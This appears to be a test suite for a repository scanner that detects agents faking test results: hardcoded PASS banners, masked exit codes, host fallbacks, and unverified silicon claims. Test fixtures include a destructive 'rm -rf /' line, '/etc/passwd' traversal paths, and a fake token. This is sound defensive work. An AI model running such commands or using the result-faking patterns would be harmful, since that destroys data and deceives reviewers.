# SPDX-License-Identifier: Apache-2.0
"""Tests for deterministic multi-language agent and evidence policy enforcement."""

from __future__ import annotations

import hashlib
import inspect
import json
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tools import agent_integrity
from tools.agent_integrity import (
    EXCLUDED_POLICY_PATHS,
    repository_files,
    scan_cmake_file,
    scan_cpp_file,
    scan_file,
    scan_markdown_file,
    scan_mlir_file,
    scan_python_file,
    scan_script_file,
    scan_structured_file,
    validate_evidence,
)

REPO_ROOT = Path(__file__).resolve().parents[2]


class PythonPolicyTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(agent_integrity, "EXCLUDED_POLICY_PATHS", set()):
                return scan_python_file(relative)

    def test_assert_true_is_blocking(self):
        findings = self.scan_source("ordinary.py", "assert True\n")
        self.assertIn("PY001", {finding.rule for finding in findings})

    def test_host_crypto_import_in_physical_test_is_blocking(self):
        findings = self.scan_source("test_example_silicon.py", "import hashlib\n")
        self.assertIn("HW001", {finding.rule for finding in findings})

    def test_hardcoded_pass_count_is_blocking(self):
        findings = self.scan_source(
            "runner.py", 'print("TOTAL VERIFIED TEST COUNT: 25 ' + '/ 25 PASS")\n'
        )
        self.assertIn("TEST002", {finding.rule for finding in findings})

    def test_exception_fallback_call_is_blocking(self):
        findings = self.scan_source(
            "test_example_silicon.py",
            "try:\n    run_device()\nexcept RuntimeError:\n    run_host_reference()\n",
        )
        self.assertIn("HW002", {finding.rule for finding in findings})

    def test_m32d_kernel_transliteration_check_is_scanned_and_clean(self):
        rel_path = Path("tools/m32d_kernel_transliteration_check.py")
        self.assertNotIn(rel_path, EXCLUDED_POLICY_PATHS)
        findings = scan_python_file(rel_path)
        self.assertEqual(findings, [])

    def test_hardcoded_pass_banner_in_scanned_fixture_is_detected(self):
        findings = self.scan_source(
            "test_fixture.py",
            'print("[cross] (2) compress/decompress d=4 primary vs indep: 5'
            + '/5 PASS each")\n',
        )
        self.assertTrue(
            any(f.rule == "TEST002" and f.severity == "critical" for f in findings)
        )


class CppPolicyTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_cpp_file(relative)

    def test_trivial_assert_true_is_blocked(self):
        findings = self.scan_source("kernel.cc", "assert(true);\n")
        self.assertIn("CPP001", {f.rule for f in findings})

    def test_trivial_static_assert_is_blocked(self):
        findings = self.scan_source("kernel.cpp", 'static_assert(true, "ok");\n')
        self.assertIn("CPP001", {f.rule for f in findings})

    def test_catch_all_fallback_is_blocked(self):
        findings = self.scan_source(
            "driver.cc",
            "try { run_npu(); } catch (...) { run_host_fallback(); }\n",
        )
        self.assertIn("CPP002", {f.rule for f in findings})

    def test_preprocessor_cpu_fallback_is_blocked(self):
        findings = self.scan_source(
            "crypto.h",
            "#ifdef USE_CPU_FALLBACK\nvoid exec() {}\n#endif\n",
        )
        self.assertIn("CPP003", {f.rule for f in findings})

    def test_hardcoded_pass_count_in_cpp_is_blocked(self):
        findings = self.scan_source(
            "test.cpp",
            'std::puts("Result: 256' + '/256 passed (100% PASS)");\n',
        )
        self.assertIn("CPP004", {f.rule for f in findings})


class ScriptPolicyTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_script_file(relative)

    def test_exit_code_masking_is_blocked(self):
        findings = self.scan_source("run.sh", "pytest tests || exit 0\n")
        self.assertIn("SH001", {f.rule for f in findings})

    def test_or_true_masking_is_blocked(self):
        findings = self.scan_source("run.sh", "./run_test || true\n")
        self.assertIn("SH001", {f.rule for f in findings})

    def test_powershell_silently_continue_is_blocked(self):
        findings = self.scan_source(
            "run.ps1",
            '$ErrorActionPreference = "SilentlyContinue"\n',
        )
        self.assertIn("SH002", {f.rule for f in findings})

    def test_powershell_erroraction_silently_continue_is_blocked(self):
        findings = self.scan_source(
            "run.ps1",
            "Get-ChildItem -ErrorAction SilentlyContinue\n",
        )
        self.assertIn("SH002", {f.rule for f in findings})

    def test_generic_python_fallback_is_blocked(self):
        findings = self.scan_source(
            "test_runner.ps1",
            "if (-not $env:IRON_PYTHON) { python test.py }\n",
        )
        self.assertIn("SH003", {f.rule for f in findings})

    def test_hardcoded_pass_banner_in_script_is_blocked(self):
        findings = self.scan_source("deploy.sh", 'echo "TOTAL: 857 ' + '/ 857 PASS"\n')
        self.assertIn("SH004", {f.rule for f in findings})

    def test_destructive_command_in_script_is_blocked(self):
        findings = self.scan_source("clean.sh", "rm -rf /\n")
        self.assertIn("SH005", {f.rule for f in findings})


class SecretsAndSafetyTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_file(relative)

    def test_private_key_header_is_blocked(self):
        findings = self.scan_source(
            "key.json",
            '{"key": "-----' + 'BEGIN RSA PRIVATE KEY-----"}\n',
        )
        self.assertIn("SEC001", {f.rule for f in findings})

    def test_github_pat_token_is_blocked(self):
        findings = self.scan_source(
            "config.yaml",
            "token: " + "ghp_" + "1234567890abcdefghijklmnopqrstuvwxyzAB\n",
        )
        self.assertIn("SEC001", {f.rule for f in findings})

    def test_personal_windows_path_is_blocked(self):
        findings = self.scan_source(
            "notes.md",
            "Captured at C:\\Users\\" + "johndoe\\Documents\\test.log\n",
        )
        self.assertIn("SEC002", {f.rule for f in findings})

    def test_personal_linux_path_is_blocked(self):
        findings = self.scan_source(
            "config.json",
            '{"log_dir": "' + "/home/" + 'developer/logs"}\n',
        )
        self.assertIn("SEC002", {f.rule for f in findings})

    def test_path_traversal_is_blocked(self):
        findings = scan_file(Path("../../outside_repo.py"))
        self.assertIn("PATH001", {f.rule for f in findings})


class DocumentationAndFormatTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_markdown_file(relative)

    def test_unannotated_physical_silicon_claim_in_markdown_is_blocked(self):
        source = "# Title\n\nThis was executed on silicon and passed.\n"
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 3 for f in findings))

    def test_valid_annotation_suppresses_claim_finding(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy_run; classification=SELF_REPORTED_UNVERIFIED] -->\n"
            + "24 "
            + "/ 24 PASS on silicon\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertFalse(any(f.rule == "DOC001" for f in findings))

    def test_marker_at_top_does_not_suppress_later_claim(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy_run; classification=SELF_REPORTED_UNVERIFIED] -->\n"
            "# Title\n\n"
            "Paragraph one.\n\n"
            "Paragraph two.\n\n" + "24 " + "/ 24 PASS on silicon\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 8 for f in findings))

    def test_marker_at_bottom_does_not_suppress_earlier_claim(self):
        source = (
            "24 " + "/ 24 PASS on silicon\n\n"
            "Paragraph one.\n\n"
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy_run; classification=SELF_REPORTED_UNVERIFIED] -->\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 1 for f in findings))

    def test_bare_historical_claim_label_does_not_suppress_finding(self):
        source = (
            "> [HISTORICAL CLAIM - UNVERIFIED]\n" + "24 " + "/ 24 PASS on silicon\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" for f in findings))

    def test_valid_annotation_applies_to_only_one_adjacent_claim(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy; classification=SELF_REPORTED_UNVERIFIED] -->\n"
            + "24 "
            + "/ 24 PASS\n"
            + "33 "
            + "/ 33 PASS\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 3 for f in findings))

    def test_second_unannotated_claim_in_same_document_is_detected(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy; classification=SELF_REPORTED_UNVERIFIED] -->\n"
            + "24 "
            + "/ 24 PASS\n\n"
            "Some text in between.\n\n" + "857 " + "/ 857 PASS\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 6 for f in findings))

    def test_missing_evidence_file_is_rejected(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence=nonexistent/path/evidence.json; commit=f51c602834a40c175184b43635504b7b474111ab; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
            "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(
            any(f.rule == "DOC002" and "does not exist" in f.message for f in findings)
        )

    def test_evidence_path_using_traversal_is_rejected(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence=../outside.json; commit=f51c602834a40c175184b43635504b7b474111ab; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
            "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(
            any(
                f.rule == "DOC002" and "escapes repository root" in f.message
                for f in findings
            )
        )

    def test_evidence_path_outside_repository_is_rejected(self):
        # Test Windows drive-letter path
        source_win = (
            "<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence=C:/Windows/system32/cmd.exe; commit=f51c602834a40c175184b43635504b7b474111ab; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
            "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
        )
        findings_win = self.scan_source("doc_win.md", source_win)
        self.assertTrue(
            any(
                f.rule == "DOC002" and "escapes repository root" in f.message
                for f in findings_win
            )
        )

        # Test POSIX absolute path
        source_posix = (
            "<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence=/etc/passwd; commit=f51c602834a40c175184b43635504b7b474111ab; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
            "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
        )
        findings_posix = self.scan_source("doc_posix.md", source_posix)
        self.assertTrue(
            any(
                f.rule == "DOC002" and "escapes repository root" in f.message
                for f in findings_posix
            )
        )

    def test_malformed_or_abbreviated_commit_sha_is_rejected(self):
        source = (
            "<!-- [CLAIM-PROVENANCE: status=HISTORICAL; source=legacy; commit=f51c602] -->\n"
            + "24 "
            + "/ 24 PASS\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(
            any(
                f.rule == "DOC002" and "abbreviated commit SHA" in f.message
                for f in findings
            )
        )

    def _create_valid_evidence_bundle(
        self,
        temporary_dir: Path,
        commit_sha: str | None = None,
        classification: str = "BIT_EXACT_PHYSICAL_SILICON",
        dr_id: str = "DR0",
        corrupt_artifact_hash: bool = False,
    ) -> Path:
        if commit_sha is None:
            commit_sha = subprocess.check_output(
                ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
            ).strip()

        artifact_bytes = b"real verified physical test artifact payload"
        artifact_hash = hashlib.sha256(artifact_bytes).hexdigest()
        for role in (
            "device_info",
            "compiler_log",
            "runtime_log",
            "case_results",
            "aie_artifact",
        ):
            (temporary_dir / f"{role}.bin").write_bytes(artifact_bytes)

        recorded_hash = "f" * 64 if corrupt_artifact_hash else artifact_hash
        manifest = {
            "schema_version": 1,
            "dr_id": dr_id,
            "evidence_class": classification,
            "repository": {"commit": commit_sha, "clean": True},
            "hardware": {
                "physical_device": True,
                "device_name": "AMD Phoenix NPU",
                "device_id": "test-device",
                "driver": "test-driver",
                "firmware": "test-firmware",
            },
            "toolchain": {
                "python": "3.13",
                "mlir_aie": "1.4.1",
                "llvm_aie": "test",
                "xrt": "test",
            },
            "execution": {
                "command": ["python", "physical_test.py"],
                "started_at": "2026-08-31T00:00:00Z",
                "ended_at": "2026-08-31T00:00:01Z",
                "exit_code": 0,
                "physical_dispatches": 1,
                "cases_selected": 1,
                "cases_executed": 1,
                "cases_passed": 1
                if classification == "BIT_EXACT_PHYSICAL_SILICON"
                else 0,
                "cases_failed": 0,
                "cases_skipped": 0,
                "cases_xfailed": 0,
            },
            "comparisons": [
                {
                    "case_id": "case-1",
                    "full_buffer": True,
                    "expected_sha256": "b" * 64,
                    "actual_sha256": "b" * 64,
                }
            ],
            "negative_tests": {
                "device_absence_nonzero": True,
                "host_reference_disabled_pass": True,
            },
            "artifacts": [
                {"role": role, "path": f"{role}.bin", "sha256": recorded_hash}
                for role in (
                    "device_info",
                    "compiler_log",
                    "runtime_log",
                    "case_results",
                    "aie_artifact",
                )
            ],
        }
        manifest_path = temporary_dir / "evidence.json"
        manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        return manifest_path

    def test_syntactically_valid_bundle_rejected_for_physical_claim(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            ev_file = self._create_valid_evidence_bundle(temp_dir, commit_sha=head)
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002"
                    and "independent physical dispatch corroboration is unavailable"
                    in f.message
                    for f in findings
                )
            )

    def test_non_physical_verified_claim_passes(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            manifest = {
                "schema_version": 1,
                "evidence_class": "HOST_REFERENCE",
                "repository": {"commit": head, "clean": True},
            }
            manifest_path = temp_dir / "host_evidence.json"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            rel_ev = manifest_path.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=HOST_REFERENCE] -->\n"
                + "[HOST REFERENCE] 21"
                + "/21 PASS on host.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertEqual(findings, [])

    def test_git_verification_exception_is_fail_closed(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            manifest = {
                "schema_version": 1,
                "evidence_class": "HOST_REFERENCE",
                "repository": {"commit": head, "clean": True},
            }
            manifest_path = temp_dir / "host_evidence.json"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            rel_ev = manifest_path.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=HOST_REFERENCE] -->\n"
                + "[HOST REFERENCE] 21"
                + "/21 PASS on host.\n"
            )
            with mock.patch.object(
                agent_integrity.subprocess, "run", side_effect=OSError("git not found")
            ):
                findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "Failed to verify commit" in f.message
                    for f in findings
                )
            )

    def test_empty_evidence_file_is_rejected(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            ev_file = Path(temporary) / "evidence.json"
            ev_file.write_text("", encoding="utf-8")
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "empty or malformed JSON" in f.message
                    for f in findings
                )
            )

    def test_malformed_evidence_file_is_rejected(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            ev_file = Path(temporary) / "evidence.json"
            ev_file.write_text("{ incomplete json: true ", encoding="utf-8")
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "empty or malformed JSON" in f.message
                    for f in findings
                )
            )

    def test_evidence_schema_failure_is_rejected(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            ev_file = Path(temporary) / "evidence.json"
            # Valid JSON but missing required schema fields
            ev_file.write_text(
                '{"schema_version": 1, "dr_id": "DR0"}', encoding="utf-8"
            )
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "Evidence validation failed" in f.message
                    for f in findings
                )
            )

    def test_mismatched_artifact_hash_is_rejected(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            ev_file = self._create_valid_evidence_bundle(
                temp_dir, commit_sha=head, corrupt_artifact_hash=True
            )
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "Evidence validation failed" in f.message
                    for f in findings
                )
            )

    def test_fabricated_commit_sha_is_rejected(self):
        fake_commit = "0" * 40
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            ev_file = self._create_valid_evidence_bundle(
                temp_dir, commit_sha=fake_commit
            )
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={fake_commit}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002"
                    and "does not exist in repository history" in f.message
                    for f in findings
                )
            )

    def test_evidence_commit_mismatch_is_rejected(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        other_commit = "1" * 40
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            ev_file = self._create_valid_evidence_bundle(
                temp_dir, commit_sha=other_commit
            )
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=BIT_EXACT_PHYSICAL_SILICON] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002" and "bound to commit" in f.message
                    for f in findings
                )
            )

    def test_self_reported_unverified_cannot_authorize_verified_physical_silicon(self):
        head = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=str(REPO_ROOT), text=True
        ).strip()
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            ev_file = self._create_valid_evidence_bundle(
                temp_dir, commit_sha=head, classification="SELF_REPORTED_UNVERIFIED"
            )
            rel_ev = ev_file.relative_to(REPO_ROOT).as_posix()
            source = (
                f"<!-- [CLAIM-PROVENANCE: status=VERIFIED; evidence={rel_ev}; commit={head}; classification=SELF_REPORTED_UNVERIFIED] -->\n"
                "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
            )
            findings = self.scan_source("doc.md", source)
            self.assertTrue(
                any(
                    f.rule == "DOC002"
                    and "cannot authorize a VERIFIED physical silicon claim"
                    in f.message
                    for f in findings
                )
            )

    def test_disclaimer_scope_does_not_suppress_subsequent_line_claim(self):
        source = (
            "This document does not claim physical silicon validation.\n"
            + "24 "
            + "/ 24 PASS on physical silicon\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(
            any(f.rule == "DOC001" and f.line == 2 for f in findings),
            "Claim on line 2 must not be suppressed by disclaimer on line 1",
        )

    def test_mentioning_doc_provenance_marker_in_policy_does_not_disable_scanning(self):
        source = (
            "# Policy Doc\n"
            "We mention DOC_PROVENANCE_MARKER here.\n\n"
            "[VERIFIED PHYSICAL SILICON] 24/24 gates pass.\n"
        )
        findings = self.scan_source("doc.md", source)
        self.assertTrue(any(f.rule == "DOC001" and f.line == 4 for f in findings))

    def test_scanner_integrity_invariant_no_document_wide_bypass(self):
        """Invariant: No marker, comment, annotation, filename, or directory may cause an entire document to skip claim scanning."""
        source_code = inspect.getsource(agent_integrity.scan_markdown_file)
        self.assertNotIn("if DOC_PROVENANCE_MARKER in source:", source_code)
        loop_pos = source_code.find("for line_number")
        self.assertGreater(
            loop_pos, 0, "scan_markdown_file must contain a line scanning loop"
        )
        # Ensure there is no early return findings before the loop
        prefix = source_code[:loop_pos]
        self.assertNotIn("return findings", prefix)

    def test_malformed_json_is_blocked(self):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "data.json"
            path.write_text("{ malformed json: true }\n", encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                findings = scan_structured_file(relative)
                self.assertIn("FMT001", {f.rule for f in findings})

    def test_valid_json_passes(self):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "data.json"
            path.write_text('{"valid": true}\n', encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                findings = scan_structured_file(relative)
                self.assertEqual([f for f in findings if f.rule == "FMT001"], [])

    def test_mlir_pass_banner_is_blocked(self):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "kernel.mlir"
            path.write_text(
                "// Total: 25 " + "/ 25 PASS\nmodule {}\n", encoding="utf-8"
            )
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                findings = scan_mlir_file(relative)
                self.assertIn("MLIR001", {f.rule for f in findings})

    def test_cmake_pass_banner_is_blocked(self):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "CMakeLists.txt"
            path.write_text(
                "# 24" + "/24 PASS on device\ncmake_minimum_required(VERSION 3.20)\n",
                encoding="utf-8",
            )
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                findings = scan_cmake_file(relative)
                self.assertIn("CMAKE001", {f.rule for f in findings})


class CIWorkflowIntegrityTests(unittest.TestCase):
    def test_ci_workflow_exists_and_contains_required_checks(self):
        ci_path = REPO_ROOT / ".github" / "workflows" / "ci.yml"
        self.assertTrue(
            ci_path.is_file(), "CI workflow file .github/workflows/ci.yml must exist"
        )
        content = ci_path.read_text(encoding="utf-8")

        required_job_names = [
            "Lint Python",
            "Validate metadata",
            "Host-safe PQC tests",
            "Verify protected DR2 evidence",
            "Check Markdown links",
        ]
        for job_name in required_job_names:
            self.assertIn(
                job_name,
                content,
                f"CI workflow must define job name '{job_name}' for GitHub branch protection.",
            )

        self.assertIn(
            "pull_request:", content, "CI workflow must trigger on pull_request"
        )
        self.assertIn("push:", content, "CI workflow must trigger on push")
        self.assertIn(
            "push:\n    branches:\n      - main\n",
            content,
            "push trigger must be scoped to main branch only",
        )
        self.assertIn(
            "pull_request:\n    branches:\n      - main\n",
            content,
            "pull_request trigger must be scoped to main branch only",
        )


class ScannerSelfProtectionTests(unittest.TestCase):
    def test_excluded_policy_paths_only_contains_self_exclusion(self):
        self.assertEqual(
            EXCLUDED_POLICY_PATHS,
            {Path("tools/agent_integrity.py")},
            "No executable repository tools may be added to EXCLUDED_POLICY_PATHS without explicit policy review.",
        )

    def test_discovery_covers_multi_language_extensions(self):
        all_files = repository_files()
        expected_extensions = {".py", ".cc", ".cpp", ".json", ".md", ".yml"}
        for ext in expected_extensions:
            self.assertTrue(
                any(p.suffix.lower() == ext for p in all_files),
                f"repository_files() must discover files with extension '{ext}'",
            )


class EvidenceTests(unittest.TestCase):
    def valid_manifest(self, artifact_hash: str):
        return {
            "schema_version": 1,
            "dr_id": "DR9",
            "evidence_class": "BIT_EXACT_PHYSICAL_SILICON",
            "repository": {"commit": "a" * 40, "clean": True},
            "hardware": {
                "physical_device": True,
                "device_name": "AMD Phoenix NPU",
                "device_id": "test-device",
                "driver": "test-driver",
                "firmware": "test-firmware",
            },
            "toolchain": {
                "python": "3.13",
                "mlir_aie": "1.4.1",
                "llvm_aie": "test",
                "xrt": "test",
            },
            "execution": {
                "command": ["python", "physical_test.py"],
                "started_at": "2026-08-31T00:00:00Z",
                "ended_at": "2026-08-31T00:00:01Z",
                "exit_code": 0,
                "physical_dispatches": 1,
                "cases_selected": 1,
                "cases_executed": 1,
                "cases_passed": 1,
                "cases_failed": 0,
                "cases_skipped": 0,
                "cases_xfailed": 0,
            },
            "comparisons": [
                {
                    "case_id": "case-1",
                    "full_buffer": True,
                    "expected_sha256": "b" * 64,
                    "actual_sha256": "b" * 64,
                }
            ],
            "negative_tests": {
                "device_absence_nonzero": True,
                "host_reference_disabled_pass": True,
            },
            "artifacts": [
                {"role": role, "path": f"{role}.bin", "sha256": artifact_hash}
                for role in (
                    "device_info",
                    "compiler_log",
                    "runtime_log",
                    "case_results",
                    "aie_artifact",
                )
            ],
        }

    def test_valid_manifest_and_artifact(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact_bytes = b"real artifact"
            artifact_hash = hashlib.sha256(artifact_bytes).hexdigest()
            for role in (
                "device_info",
                "compiler_log",
                "runtime_log",
                "case_results",
                "aie_artifact",
            ):
                (root / f"{role}.bin").write_bytes(artifact_bytes)
            manifest_path = root / "manifest.json"
            manifest = self.valid_manifest(artifact_hash)
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            self.assertEqual(
                validate_evidence(manifest, manifest_path, check_files=True), []
            )

    def test_zero_cases_and_mismatched_output_are_rejected(self):
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "manifest.json"
            manifest = self.valid_manifest("c" * 64)
            manifest["execution"]["cases_selected"] = 0
            manifest["execution"]["cases_executed"] = 0
            manifest["execution"]["cases_passed"] = 0
            manifest["comparisons"][0]["actual_sha256"] = "d" * 64
            errors = validate_evidence(manifest, path)
            self.assertTrue(any("at least one case" in error for error in errors))
            self.assertTrue(any("hashes differ" in error for error in errors))

    def test_artifact_path_escape_is_rejected(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            manifest = self.valid_manifest("e" * 64)
            manifest["artifacts"][0]["path"] = "../outside.bin"
            errors = validate_evidence(
